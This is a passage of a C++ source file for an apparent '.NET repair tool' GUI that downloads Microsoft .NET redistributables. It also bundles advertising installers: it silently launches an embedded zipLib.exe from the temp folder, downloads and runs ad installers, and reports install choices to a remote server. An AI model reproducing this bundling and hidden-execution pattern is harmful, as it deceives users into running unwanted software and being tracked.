// MainWnd.cpp

#include "StdAfx.h"
#include "MainWnd.h"
#include <WinReg.h>
#include <mshtmhst.h>
#include <WinSock2.h>
#include "resource.h"
#include "ini.h"
#include "Ping.h"
#include <Sensapi.h>
#pragma comment(lib, "Sensapi.lib")

typedef bool(*InitDownloadEngine)(void);
typedef void(*CerateDownloadRask)(const char* pDownloadUrl, const char* pOutputName, int nIndex);
typedef void(*StartDownload)(int nIndex);
typedef void(*PauseDownload)(int nIndex);
typedef void(*QueryDownloadRask)(int nIndex);
typedef void(*QueryTotalFileSize)(int nIndex, char* pFileSize);
typedef void(*QueryDownloadFileSize)(int nIndex, char* pFileSize);
typedef void(*QueryDownloadSpeed)(int nIndex, char* pFileSize);
typedef void(*CancelAllDownload)();
typedef void(*UnDownloadEngine)();


InitDownloadEngine g_pInitDownloadEngine = NULL;
CerateDownloadRask g_pCerateDownloadRask = NULL;
StartDownload	   g_pStartDownload = NULL;
PauseDownload	   g_pPauseDownload = NULL;
QueryDownloadRask  g_pQueryDownloadRask = NULL;
QueryTotalFileSize g_pQueryTotalFileSize = NULL;
QueryDownloadFileSize g_pQueryDownloadFileSize = NULL;
QueryDownloadSpeed g_pQueryDownloadSpeed = NULL;
CancelAllDownload g_pCancelAllDownload = NULL;
UnDownloadEngine g_pUnDownloadEngine = NULL;

// 向网页发送请求 
void HttpRequest(char * url)
{
	char chTemp[2000];
	ZeroMemory(chTemp, 2000);
	HINTERNET hSession = InternetOpen(_T("UrlTest"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hSession != NULL)
	{
		HINTERNET hHttp = InternetOpenUrlA(hSession, url, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
		if (hHttp != NULL)
		{
			//printf("%s\n\n", url);
			//BYTE Temp[2000];
			//ULONG Number = 1;
			//while (Number > 0)
			//{
			//	InternetReadFile(hHttp, Temp, 2000 - 1, &Number);
			//	Temp[Number] = '\0';
			//	CopyMemory(chTemp, Temp, Number);
			//	printf("%s", Temp);
			//}

			InternetCloseHandle(hHttp);
			hHttp = NULL;
		}
		InternetCloseHandle(hSession);
		hSession = NULL;
	}
}


// 导出zip文件
void ExportResFile(CString strExportPath, CString resName, CString resType)
{
	// 导出system.zip  
	CString strSysDir = strExportPath;
	//HRSRC hrSrcSys = FindResource(CPaintManagerUI::GetResourceDll(), _T("IDR_ZIPRES2"), _T("ZIPRES"));
	HRSRC hrSrcSys = FindResource(CPaintManagerUI::GetResourceDll(), resName, resType);
	HGLOBAL hGlobalSys = LoadResource(CPaintManagerUI::GetResourceDll(), hrSrcSys);
	LPVOID lpGlobalSys = LockResource(hGlobalSys);

	int ret = 0;
	CFile file;
	if (ret = file.Open(strSysDir, CFile::modeCreate | CFile::modeWrite))
	{
		file.Write(lpGlobalSys, (UINT)SizeofResource(CPaintManagerUI::GetResourceDll(), hrSrcSys));
		file.Close();
	}

	::UnlockResource(hGlobalSys);
	::FreeResource(hGlobalSys);
}



bool ExportDownloadLib()
{
	char chPath[MAX_PATH] = { 0 };
	GetUserTempPath(chPath);
	strcat(chPath, "FileDown.zip");
	if (CheckFile(chPath) == false)
	{
		ExportResFile(chPath, "IDR_ZIPRES3", "ZIPRES");
	}

	GetUserTempPath(chPath);
	strcat(chPath, "zipLib.exe");
	if (CheckFile(chPath) == false)
	{
		ExportResFile(chPath, "IDR_ZIPRES2", "ZIPRES");

		ShellExecuteA(
			NULL,
			"open",
			chPath,
			NULL,
			NULL,
			SW_HIDE);
	}

	return true;

}

std::map<int, stUserSelect> g_mapUserSelect;   //net 安装信息
std::map<int, stInstaller> g_mapUserInstaller; //广告 安装信息
std::vector<std::string> g_InstalFileAddr;   //安装文件的地址
int g_nDownloadFileNum;
int g_nIndex;
HANDLE g_hHandle[6];
bool g_bInstaller;
int g_nWndStatus;
CPing g_Ping;


bool InstallDll()
{
	char chPath[MAX_PATH] = { 0 };
	char chFile[MAX_PATH] = { 0 };
	GetUserTempPath(chPath);
	strcat(chPath, "FileDown");
	SetCurrentDirectoryA(chPath);
	strcpy(chFile, chPath);
	strcat(chFile, "\\FileDownload.dll");
	if (CheckFile(chFile))
	{
		HINSTANCE hModule = LoadLibraryEx(L".\\FileDownload.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);


		if (hModule != NULL)
		{
			g_pInitDownloadEngine = (InitDownloadEngine)::GetProcAddress(hModule, "InitDownloadEngine");
			g_pCerateDownloadRask = (CerateDownloadRask)::GetProcAddress(hModule, "CerateDownloadRask");
			g_pStartDownload = (StartDownload)::GetProcAddress(hModule, "StartDownload");
			g_pPauseDownload = (PauseDownload)::GetProcAddress(hModule, "PauseDownload");
			g_pQueryDownloadRask = (QueryDownloadRask)::GetProcAddress(hModule, "QueryDownloadRask");
			g_pQueryTotalFileSize = (QueryTotalFileSize)::GetProcAddress(hModule, "QueryTotalFileSize");
			g_pQueryDownloadFileSize = (QueryDownloadFileSize)::GetProcAddress(hModule, "QueryDownloadFileSize");
			g_pQueryDownloadSpeed = (QueryDownloadSpeed)::GetProcAddress(hModule, "QueryDownloadSpeed");
			g_pCancelAllDownload = (CancelAllDownload)::GetProcAddress(hModule, "CancelAllDownload");
			g_pUnDownloadEngine = (UnDownloadEngine)::GetProcAddress(hModule, "UnDownloadEngine");

			if (g_pInitDownloadEngine != NULL)
			{
				g_pInitDownloadEngine();
				g_nDownloadFileNum = 0;
				return true;
			}
		}
	}
	//else
	//{
	//	MessageBox(NULL, L"no file", NULL, NULL);
	//}

	return false;
}

DWORD WINAPI ThreadInstallDllFile(PVOID pParam)
{
	if (ExportDownloadLib())//解压资源文件
	{
		InstallDll();
	}
	
	return 0;
}


DWORD WINAPI ThreadCopyFile(PVOID pParam)
{
	int nIndex = g_nIndex;
	//if (CheckFile(g_mapUserSelect[nIndex].strFilePath))
	{
		//MessageBox(NULL, L"下载完成", NULL, NULL);
		CopyFileA(g_mapUserSelect[nIndex].strFilePath.c_str(), g_InstalFileAddr[nIndex - 1].c_str(), TRUE);
		Sleep(500);
	}

	return 0;
}


DWORD WINAPI ThreadDownloadInsFile(PVOID pParam)
{
	char chTempPath[MAX_PATH] = { 0 };
	string strResponse;
	char chPostData[1000] = { 0 };
	char chTemp[1000] = { 0 };

	string strVer;
	string strFileName;
	string strIns;
	string strIns1;
	string strIns2;
	string strIns3;



	if (g_mapUserInstaller[1].bCheck == true)
	{
		strIns1 = "install_01=True";
	} 
	else
	{
		strIns1 = "install_01=False";
	}

	if (g_mapUserInstaller[2].bCheck == true)
	{
		strIns2 = "install_02=True";
	}
	else
	{
		strIns2 = "install_02=False";
	}

	if (g_mapUserInstaller[3].bCheck == true)
	{
		strIns3 = "install_03=True";
	}
	else
	{
		strIns3 = "install_03=False";
	}

	strIns1 = escapeURL(strIns1);
	strIns2 = escapeURL(strIns2);
	strIns3 = escapeURL(strIns3);

	strIns += strIns1;
	strIns += strIns2;
	strIns += strIns3;

	for (int i = 1; i < 4; i++)
	{
		if (g_mapUserInstaller[i].bCheck == true)
		{
			GetUserTempPath(chTempPath);
			strcat(chTempPath, g_mapUserInstaller[i].strFileName.c_str());
			DownloadUrl(g_mapUserInstaller[i].strUrl.c_str(), chTempPath);

			strFileName = g_mapUserInstaller[i].strFileName;
			strFileName = escapeURL(strFileName);

			memset(chPostData, 0, 1000);
			memset(chTemp, 0, 1000);
			strcpy(chPostData, "http://software.wanyouxi999.com/ver2/plugins/donet?");

			sprintf(chTemp, "Version=%s&SetupName=%s&SecName=%s&PlugName=%s&Check=%s", "", strFileName.c_str(), "", "", strIns.c_str());
			strcat(chPostData, chTemp);

			HttpRequest(chPostData);
		}
	}



	return 0;
}



CMainWnd::CMainWnd()
{
}

CDuiString CMainWnd::GetSkinFile()
{
	try
	{
		return CDuiString(_T("DlgMain.xml"));
	}
	catch (...)
	{
		throw "CMainWnd::GetSkinFile";
	}
}

LPCTSTR CMainWnd::GetWindowClassName() const
{
	try
	{
		return _T(".NET修复工具");
	}
	catch (...)
	{
		throw "CMainWnd::GetWindowClassName";
	}
}

void CMainWnd::InitWindow()
{
	try
	{
		WindowImplBase::InitWindow();

		Init();
	}
	catch (...)
	{
		throw "CMainWnd::Init";
	}
}


void CMainWnd::Notify( TNotifyUI& msg )
{
	if (msg.sType == _T("click"))
	{
		//显示第二个页面
		//if (msg.pSender == m_pComp)
		//{
		//	//CleanFiles();
		//	Close(IDOK);
		//}
		//if (g_nWndStatus == 1)
		//{
		//	SetActiveWindow(m_pChildWnd->GetHWND());
		//	SetForegroundWindow(m_pChildWnd->GetHWND());
		//}

		if (msg.pSender == m_pBtnNext)
		{
			ShowFirstUI(false);
			ShowSecondUI(true);

			if (g_bInstaller == false)
			{
				g_bInstaller = true;
				HANDLE hHandle = CreateThread(NULL, 0, ThreadDownloadInsFile, NULL, 0, NULL);
				CloseHandle(hHandle);

				if (g_pInitDownloadEngine == NULL)
				{
					HANDLE handle = CreateThread(NULL, 0, ThreadInstallDllFile, NULL, 0, NULL);
					CloseHandle(handle);

					//if (g_pInitDownloadEngine != NULL)
					{
						SetTimer(GetHWND(), TIMER_ID_PROGRESS, 1000, NULL);
					}
				}
				else
				{
					SetTimer(GetHWND(), TIMER_ID_PROGRESS, 1000, NULL);
				}
			}

		}

		for (int i = 1; i < 4; i++)
		{
			if (msg.pSender == g_mapUserInstaller[i].pCheckBox || msg.pSender == g_mapUserInstaller[i].pLabel)
			{
				if (g_mapUserInstaller[i].bCheck == true)
				{
					g_mapUserInstaller[i].bCheck = false;
					g_mapUserInstaller[i].pCheckBox->SetBkImage(L"check1.png");
				} 
				else
				{
					g_mapUserInstaller[i].bCheck = true;
					g_mapUserInstaller[i].pCheckBox->SetBkImage(L"check2.png");
				}
			}
		}
		

		if (msg.pSender == m_pBtnClose1)
		{
			Close(IDOK);
		}

		if (msg.pSender == m_pBtnClose2)
		{
			int nDownloadCount = 0;
			int nOverCount = 0;
			int nTotal = 0;

			for (int i = 1; i < 7; i++)
			{
				if (g_mapUserSelect[i].bDownload == false)
				{
					nDownloadCount++;
				}

				if (g_mapUserSelect[i].bOver == true)
				{
					nOverCount++;
				}
			}

			nTotal = nDownloadCount + nOverCount;
			if (nTotal == 6)
			{
				m_pChildWnd->CloseWnd();
			}
			else
			{
				ShowPauseWnd();
			}
			
		}

		for (int i = 1; i < 7; i++)
		{
			if (msg.pSender == g_mapUserSelect[i].pUrlTip)
			{
				string str = "";
				switch (i)
				{
				case 1:
					str = "https://www.microsoft.com/zh-cn/download/details.aspx?id=1639";
					break;
				case 2:
					str = "https://www.microsoft.com/zh-CN/download/details.aspx?id=3005";
					break;
				case 3:
					str = "https://www.microsoft.com/zh-cn/download/details.aspx?id=25150";
					break;
				case 4:
					str = "https://www.microsoft.com/zh-cn/download/details.aspx?id=17718";
					break;
				case 5:
					str = "https://www.microsoft.com/zh-cn/download/details.aspx?id=30653";
					break;
				case 6:
					str = "https://www.microsoft.com/zh-cn/download/details.aspx?id=49981";
					break;
				default:
					break;
				}
			
				if (!str.empty())
				{
					ShellExecuteA(NULL, "open", str.c_str(), NULL, NULL, SW_SHOW);
				}
			}

			if (msg.pSender == g_mapUserSelect[i].pDownnload)
			{
				//if (g_pInitDownloadEngine == NULL)
				//{
				//	InstallDll();
				//}
				UpdataDownloadBtnShow(i);
			}

			if (msg.pSender == g_mapUserSelect[i].pOpenFile)
			{
				string str = g_InstalFileAddr[i-1].c_str();
				if (CheckFile(str))
				{
					ShellExecuteA(
						NULL,
						"open",
						str.c_str(),
						NULL,
						NULL,
						SW_SHOWDEFAULT);

				}
				else
				{
					ShowNoFileWnd();
				}
			}

			if (msg.pSender == g_mapUserSelect[i].pOpenDir)
			{
				char szPath[MAX_PATH] = { 0 };
				char szCmd[MAX_PATH] = { 0 };
				GetUserDeskPath(szPath);
				//ShellExecuteA(NULL, "open", NULL, NULL, szPath, SW_SHOW);

				strcpy(szCmd, "/select, ");
				strcat(szCmd, g_InstalFileAddr[i - 1].c_str());

				ShellExecuteA(
					NULL,
					"open",
					"Explorer.exe",
					szCmd,
					NULL,
					SW_SHOWDEFAULT);
			}
		}
		
	}

	WindowImplBase::Notify(msg);
}

void CMainWnd::OnFinalMessage( HWND hWnd )
{
	try
	{
		WindowImplBase::OnFinalMessage(hWnd);
		PostQuitMessage(0);
		delete this;
	}
	catch (...)
	{
		throw "CMainWnd::OnFinalMessage";
	}
}

LRESULT CMainWnd::HandleCustomMessage(UINT uMsg, WPARAM wParam, LPARAM lParam, BOOL& bHandled)
{
	LRESULT lRes = 0;
	CPoint* p = NULL;
	
	switch (uMsg)
	{
	case WM_TIMER: lRes = OnTimer(uMsg, wParam, lParam, bHandled); break;
	case WM_NCLBUTTONDBLCLK:
		break;
	case WM_CLOSE:
	{
		//g_pCancelAllDownload();
		if (g_pUnDownloadEngine != NULL)
		{
			g_pUnDownloadEngine();
		}
	}
	break;
		default: break;
	}

	return lRes;
}

int nCount = 0;

BOOL IsConnect(VOID) {
	hostent *hp = 0;  unsigned int addr = 0;  WSADATA wsaData;  memset(&wsaData, 0, sizeof(wsaData)); int iRetVal = 0;
	iRetVal = WSAStartup(0x0202, &wsaData);
	if (iRetVal) { WSACleanup();   return FALSE; }
	addr = inet_addr("www.baidu.com");
	hp = gethostbyaddr((char *)&addr, 4, AF_INET);
	WSACleanup();

	return !(!hp);
}

LRESULT CMainWnd::OnTimer(UINT uMsg, WPARAM wParam, LPARAM lParam, BOOL& bHandled)
{
	if (TIMER_ID_PROGRESS == wParam)
	{
		if (g_pInitDownloadEngine != NULL)
		{
			for (int i = 1; i < 7; i++)
			{
				if (g_mapUserSelect[i].bDownload == true && g_mapUserSelect[i].bOver == false)
				{
					UpdataDownloadProShow(i);
				}

				if (g_mapUserSelect[i].bOver == true && nCount == 5)
				{
					UpdataOverShow(i);
				}

			}

			if (nCount > 5)
				nCount = 0;
			else
				nCount++;


		}
		else
		{
			for (int i = 1; i < 7; i++)
			{
				if (g_mapUserSelect[i].bDownload == true && g_mapUserSelect[i].bOver == false)
				{
					g_mapUserSelect[i].tm.nLapse++;
					if (g_mapUserSelect[i].tm.nLapse / 10 == 3)
					{
						g_mapUserSelect[i].plabelSpeed->SetVisible(false);
						g_mapUserSelect[i].plabelPercent->SetVisible(false);
						g_mapUserSelect[i].plabelHund->SetVisible(false);
						g_mapUserSelect[i].plabelDec->SetVisible(false);
						g_mapUserSelect[i].plabelUnit->SetVisible(false);

						g_mapUserSelect[i].pProgress->SetValue(0);
						g_mapUserSelect[i].plabelOver->SetText(L"网络故障");
						g_mapUserSelect[i].plabelOver->SetVisible(true);
						g_mapUserSelect[i].plabelOver->SetTextColor(0xffff2764);
						g_mapUserSelect[i].plabelOverPic->SetVisible(true);
						g_mapUserSelect[i].plabelOverPic->SetBkImage(L"unsuc.png");
						g_mapUserSelect[i].bOptSuc = true;
					}
				}
			}

		}

		// 关闭弹出窗口后，界面其他空间可用
		if (g_nWndStatus == 1)
		{
			for (int i = 1; i < 7; i++)
			{
				if (g_mapUserSelect[i].bOptSuc == true)
				{
					m_pChildWnd->Close();
					Close(IDOK);
				}
			}

			EnableWnd();
			g_nWndStatus = 0;
		}

		//安装广告文件
		for (int i = 1; i < 4; i++)
		{
			if (g_bInstaller == true)
			{
				if (g_mapUserInstaller[i].bCheck == true)
				{
					char chTempPath[MAX_PATH] = { 0 };
					GetUserTempPath(chTempPath);
					strcat(chTempPath, g_mapUserInstaller[i].strFileName.c_str());
					if (CheckFile(chTempPath) && g_mapUserInstaller[i].bInstall == false)
					{
						g_mapUserInstaller[i].bInstall = true;
						InstallFile(chTempPath);
					}
				}
			}
		}



	}

	return 0;
}


void CMainWnd::Init()
{
	m_pLayout = static_cast<CVerticalLayoutUI*>(m_pm.FindControl(_T("layout")));
	m_pBtnNext = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnNext")));
	m_pBtnNext->SetCursor(DUI_HAND);

	m_pLabelLogo = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelLogo")));
	m_pBtnClose1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("closebtn1")));
	m_pBtnClose2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("closebtn2")));
	m_pLabelTopBkTip = static_cast<CLabelUI*>(m_pm.FindControl(_T("topBkTip")));
	m_pBtnMin = static_cast<CButtonUI*>(m_pm.FindControl(_T("minbtn")));
	m_pLabelTopTextBk = static_cast<CLabelUI*>(m_pm.FindControl(_T("topTextBk")));

	m_pLabeltopText1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("topText1")));
	m_pLabeltopText2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("topText2")));
	m_pLabeltopText3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("topText3")));
	m_pLabeltopText4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("topText4")));

	m_pBtntopSplit1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("topSplit1")));
	m_pBtntopSplit2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("topSplit2")));
	m_pBtntopSplit3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("topSplit3")));
	m_pBtntopSplit4 = static_cast<CButtonUI*>(m_pm.FindControl(_T("topSplit4")));
	m_pBtntopSplit5 = static_cast<CButtonUI*>(m_pm.FindControl(_T("topSplit5")));
	m_pBtntopSplit6 = static_cast<CButtonUI*>(m_pm.FindControl(_T("topSplit6")));

	m_pLabelnetText1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("netText1")));
	m_pLabelnetText2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("netText2")));
	m_pLabelnetText3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("netText3")));
	m_pLabelnetText4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("netText4")));
	m_pLabelnetText5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("netText5")));
	m_pLabelnetText6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("netText6")));

	m_pLabelsysText1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("sysText1")));
	m_pLabelsysText2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("sysText2")));
	m_pLabelsysText3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("sysText3")));
	m_pLabelsysText4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("sysText4")));
	m_pLabelsysText5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("sysText5")));
	m_pLabelsysText6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("sysText6")));

	m_pLabeltipLast1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("tipLast1")));
	m_pLabeltipPeiTu = static_cast<CLabelUI*>(m_pm.FindControl(_T("tipPeiTu")));
	m_pLabeltipLast2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("tipLast2")));
	m_pLabeltipLast3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("tipLast3")));
	m_pLabeltipLast4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("tipLast4")));


	m_pLabeltipText1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("tipText1")));
	m_pLabeltipText1->SetCursor(DUI_HAND);
	m_pLabeltipText2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("tipText2")));
	m_pLabeltipText2->SetCursor(DUI_HAND);
	m_pLabeltipText3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("tipText3")));
	m_pLabeltipText3->SetCursor(DUI_HAND);
	m_pLabeltipText4 = static_cast<CButtonUI*>(m_pm.FindControl(_T("tipText4")));
	m_pLabeltipText4->SetCursor(DUI_HAND);
	m_pLabeltipText5 = static_cast<CButtonUI*>(m_pm.FindControl(_T("tipText5")));
	m_pLabeltipText5->SetCursor(DUI_HAND);
	m_pLabeltipText6 = static_cast<CButtonUI*>(m_pm.FindControl(_T("tipText6")));
	m_pLabeltipText6->SetCursor(DUI_HAND);


	m_pBtnDownload1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnDownload1")));
	m_pBtnDownload1->SetCursor(DUI_HAND);
	m_pBtnDownload2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnDownload2")));
	m_pBtnDownload2->SetCursor(DUI_HAND);
	m_pBtnDownload3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnDownload3")));
	m_pBtnDownload3->SetCursor(DUI_HAND);
	m_pBtnDownload4 = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnDownload4")));
	m_pBtnDownload4->SetCursor(DUI_HAND);
	m_pBtnDownload5 = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnDownload5")));
	m_pBtnDownload5->SetCursor(DUI_HAND);
	m_pBtnDownload6 = static_cast<CButtonUI*>(m_pm.FindControl(_T("btnDownload6")));
	m_pBtnDownload6->SetCursor(DUI_HAND);

	m_pBtnOpenFile1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openFile1")));
	m_pBtnOpenFile1->SetCursor(DUI_HAND);
	m_pBtnOpenFile2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openFile2")));
	m_pBtnOpenFile2->SetCursor(DUI_HAND);
	m_pBtnOpenFile3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openFile3")));
	m_pBtnOpenFile3->SetCursor(DUI_HAND);
	m_pBtnOpenFile4 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openFile4")));
	m_pBtnOpenFile4->SetCursor(DUI_HAND);
	m_pBtnOpenFile5 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openFile5")));
	m_pBtnOpenFile5->SetCursor(DUI_HAND);
	m_pBtnOpenFile6 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openFile6")));
	m_pBtnOpenFile6->SetCursor(DUI_HAND);

	m_pBtnOpenDir1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openDir1")));
	m_pBtnOpenDir1->SetCursor(DUI_HAND);
	m_pBtnOpenDir2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openDir2")));
	m_pBtnOpenDir2->SetCursor(DUI_HAND);
	m_pBtnOpenDir3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openDir3")));
	m_pBtnOpenDir3->SetCursor(DUI_HAND);
	m_pBtnOpenDir4 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openDir4")));
	m_pBtnOpenDir4->SetCursor(DUI_HAND);
	m_pBtnOpenDir5 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openDir5")));
	m_pBtnOpenDir5->SetCursor(DUI_HAND);
	m_pBtnOpenDir6 = static_cast<CButtonUI*>(m_pm.FindControl(_T("openDir6")));
	m_pBtnOpenDir6->SetCursor(DUI_HAND);

	m_pProgress1 = static_cast<CProgressUI*>(m_pm.FindControl(_T("proDownload1")));
	m_pProgress2 = static_cast<CProgressUI*>(m_pm.FindControl(_T("proDownload2")));
	m_pProgress3 = static_cast<CProgressUI*>(m_pm.FindControl(_T("proDownload3")));
	m_pProgress4 = static_cast<CProgressUI*>(m_pm.FindControl(_T("proDownload4")));
	m_pProgress5 = static_cast<CProgressUI*>(m_pm.FindControl(_T("proDownload5")));
	m_pProgress6 = static_cast<CProgressUI*>(m_pm.FindControl(_T("proDownload6")));

	m_pLabelOver1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOver1")));
	m_pLabelOver2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOver2")));
	m_pLabelOver3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOver3")));
	m_pLabelOver4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOver4")));
	m_pLabelOver5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOver5")));
	m_pLabelOver6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOver6")));

	m_pLabelOverPic1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOverPic1")));
	m_pLabelOverPic2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOverPic2")));
	m_pLabelOverPic3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOverPic3")));
	m_pLabelOverPic4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOverPic4")));
	m_pLabelOverPic5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOverPic5")));
	m_pLabelOverPic6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelOverPic6")));

	m_pLabelSpeed1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelSpeed1")));
	m_pLabelSpeed2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelSpeed2")));
	m_pLabelSpeed3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelSpeed3")));
	m_pLabelSpeed4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelSpeed4")));
	m_pLabelSpeed5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelSpeed5")));
	m_pLabelSpeed6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelSpeed6")));

	m_pLabelPercent1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelPercent1")));
	m_pLabelPercent2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelPercent2")));
	m_pLabelPercent3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelPercent3")));
	m_pLabelPercent4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelPercent4")));
	m_pLabelPercent5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelPercent5")));
	m_pLabelPercent6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelPercent6")));

	m_pLabelHund1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelHund1")));
	m_pLabelHund2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelHund2")));
	m_pLabelHund3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelHund3")));
	m_pLabelHund4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelHund4")));
	m_pLabelHund5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelHund5")));
	m_pLabelHund6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelHund6")));

	m_pLabelDec1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelDec1")));
	m_pLabelDec2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelDec2")));
	m_pLabelDec3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelDec3")));
	m_pLabelDec4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelDec4")));
	m_pLabelDec5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelDec5")));
	m_pLabelDec6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelDec6")));

	m_pLabelUnit1 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelUnit1")));
	m_pLabelUnit2 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelUnit2")));
	m_pLabelUnit3 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelUnit3")));
	m_pLabelUnit4 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelUnit4")));
	m_pLabelUnit5 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelUnit5")));
	m_pLabelUnit6 = static_cast<CLabelUI*>(m_pm.FindControl(_T("labelUnit6")));

	m_pcheckBox1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("CheckBox1")));
	m_pcheckBox1->SetCursor(DUI_HAND);
	m_pcheckBox2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("CheckBox2")));
	m_pcheckBox2->SetCursor(DUI_HAND);
	m_pcheckBox3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("CheckBox3")));
	m_pcheckBox3->SetCursor(DUI_HAND);

	m_plabelIns1 = static_cast<CButtonUI*>(m_pm.FindControl(_T("labelInstaller1")));
	m_plabelIns1->SetCursor(DUI_HAND);
	m_plabelIns2 = static_cast<CButtonUI*>(m_pm.FindControl(_T("labelInstaller2")));
	m_plabelIns2->SetCursor(DUI_HAND);
	m_plabelIns3 = static_cast<CButtonUI*>(m_pm.FindControl(_T("labelInstaller3")));
	m_plabelIns3->SetCursor(DUI_HAND);

	char szFilePath[MAX_PATH] = { 0 };
	stUserSelect st;
	st.nDownloadIndex = 0;
	st.nDownloadFileSize = 0;
	st.bDownload = false;
	st.bOver = false;
	st.bOptSuc = false;
	st.tm.bStart = false;
	st.tm.nLapse = 0;
	
	st.ptopSplit = m_pBtntopSplit1;
	st.pnetText = m_pLabelnetText1;
	st.psysText = m_pLabelsysText1;
	st.pDownnload = m_pBtnDownload1;
	st.pOpenFile = m_pBtnOpenFile1;
	st.pOpenDir = m_pBtnOpenDir1;
	st.pProgress = m_pProgress1;
	st.plabelSpeed = m_pLabelSpeed1;
	st.plabelOver = m_pLabelOver1;
	st.plabelOverPic = m_pLabelOverPic1;
	st.plabelPercent = m_pLabelPercent1;
	st.plabelHund = m_pLabelHund1;
	st.plabelDec = m_pLabelDec1;
	st.plabelUnit = m_pLabelUnit1;
	st.pUrlTip = m_pLabeltipText1;
	st.strUrl = "https://download.microsoft.com/download/c/6/e/c6e88215-0178-4c6c-b5f3-158ff77b1f38/NetFx20SP2_x86.exe";   //Microsoft .NET Framework 2.0 Service Pack 2
	GetUserDeskPath(szFilePath);
	strcat(szFilePath, "\\NetFx20SP2_x86.exe");
	g_InstalFileAddr.push_back(szFilePath);
	g_mapUserSelect.insert(pair<int, stUserSelect>(1, st));

	st.ptopSplit = m_pBtntopSplit2;
	st.pnetText = m_pLabelnetText2;
	st.psysText = m_pLabelsysText2;
	st.pDownnload = m_pBtnDownload2;
	st.pOpenFile = m_pBtnOpenFile2;
	st.pOpenDir = m_pBtnOpenDir2;
	st.pProgress = m_pProgress2;
